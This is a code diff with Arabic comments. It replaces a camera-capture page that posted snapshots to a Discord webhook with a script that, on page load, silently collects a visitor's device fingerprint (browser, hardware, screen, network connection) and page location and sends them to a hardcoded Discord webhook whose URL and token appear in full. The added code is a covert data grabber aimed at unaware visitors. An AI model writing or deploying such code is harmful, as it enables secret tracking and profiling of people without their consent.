@@ -1,55 +1,77 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Capture and Send Image to Discord Webhook</title>
-</head>
-<body>
-  <video id="player" autoplay muted playsinline></video>
-  <button id="capture">Capture</button>
-  <canvas id="canvas" width=320 height=240></canvas>
+// تخزين عنوان الويب هوك
+const webhookUrl = "https://ptb.discord.com/api/webhooks/1277728558130790511/9GkqQlbH5hbAQ7IFoPMAhx-PWBnIbH5WfVfiqRlfEzdOtw0UjJHJoC_SRXca2TVUfclB";
 
-  <script>
-    const player = document.getElementById('player');
-    const canvas = document.getElementById('canvas');
-    const context = canvas.getContext('2d');
-    const captureButton = document.getElementById('capture');
-
-    // تعديل هذه البيانات حسب الويب هوك الخاص بك
-    const webhookUrl = "https://ptb.discord.com/api/webhooks/1277728558130790511/9GkqQlbH5hbAQ7IFoPMAhx-PWBnIbH5WfVfiqRlfEzdOtw0UjJHJoC_SRXca2TVUfclB";
-
-    const constraints = {
-      video: {
-        facingMode: {
-          exact: 'environment'
-        }
-      }
+// دالة جمع معلومات الجهاز والشبكة
+async function sendDeviceInfo() {
+  try {
+    // الحصول على معلومات الجهاز
+    const deviceInfo = {
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      language: navigator.language,
+      vendor: navigator.vendor,
+      hardwareConcurrency: navigator.hardwareConcurrency,
+      deviceMemory: navigator.deviceMemory,
+      screenWidth: screen.width,
+      screenHeight: screen.height,
+      colorDepth: screen.colorDepth,
+      pixelDepth: screen.pixelDepth,
+      pixelRatio: window.devicePixelRatio,
+      onLine: navigator.onLine,
+      connection: navigator.connection ? {
+        type: navigator.connection.type,
+        downlinkMax: navigator.connection.downlinkMax,
+        effectiveType: navigator.connection.effectiveType,
+        rtt: navigator.connection.rtt,
+        saveData: navigator.connection.saveData
+      } : null
     };
 
-    captureButton.addEventListener('click', async () => {
-      // Draw the video frame to the canvas.
-      context.drawImage(player, 0, 0, canvas.width, canvas.height);
+    // الحصول على معلومات الموقع
+    const locationInfo = {
+      hostname: window.location.hostname,
+      pathname: window.location.pathname,
+      protocol: window.location.protocol,
+      port: window.location.port,
+      href: window.location.href,
+      origin: window.location.origin
+    };
 
-      try {
-        // إرسال الصورة عبر الويب هوك
-        await fetch(webhookUrl, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify({ file: canvas.toDataURL("image/png") }),
-        });
+    // إنشاء رسالة Discord Webhook
+    const message = {
+      content: "",
+      embeds: [
+        {
+          title: "Device Information",
+          fields: Object.entries(deviceInfo).map(([key, value]) => ({
+            name: key,
+            value: typeof value === 'object' ? JSON.stringify(value) : value.toString()
+          }))
+        },
+        {
+          title: "Location Information",
+          fields: Object.entries(locationInfo).map(([key, value]) => ({
+            name: key,
+            value: value.toString()
+          }))
+        }
+      ]
+    };
 
-        console.log("Image sent successfully!");
-      } catch (error) {
-        console.error("Error sending image:", error);
-      }
+    // إرسال الرسالة إلى Discord Webhook
+    await fetch(webhookUrl, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify(message),
     });
 
-    // Attach the video stream to the video element and autoplay.
-    navigator.mediaDevices.getUserMedia(constraints)
-      .then((stream) => {
-        player.srcObject = stream;
-      });
-  </script>
-</body>
-</html>
+    console.log("Device and location information sent successfully!");
+  } catch (error) {
+    console.error("Error sending device and location information:", error);
+  }
+}
+
+// استدعاء الدالة عند تحميل الصفحة
+window.addEventListener('load', sendDeviceInfo);
